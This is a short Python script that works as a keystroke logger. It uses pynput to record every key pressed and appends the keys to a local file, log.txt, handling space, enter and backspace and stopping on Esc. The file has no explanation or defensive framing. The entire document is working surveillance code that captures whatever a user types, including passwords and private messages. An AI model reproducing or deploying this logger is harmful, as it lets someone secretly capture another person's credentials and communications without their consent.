import os
from pynput.keyboard import Key, Listener


def on_press(key):
    write_file(key)


def write_file(key):
    with open("log.txt", "a+") as f:
        k = str(key).replace("'", "")
        print(k)
        if k.find("space") > 0:
            f.write(' ')
        if k.find("backspace") > 0:
            f.seek(0, 2)
            f.seek(f.tell() - 2, os.SEEK_SET)
            f.truncate()
        if k.find("enter") > 0:
            f.write('\n')
        elif k.find("Key") == -1:
            f.write(k)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
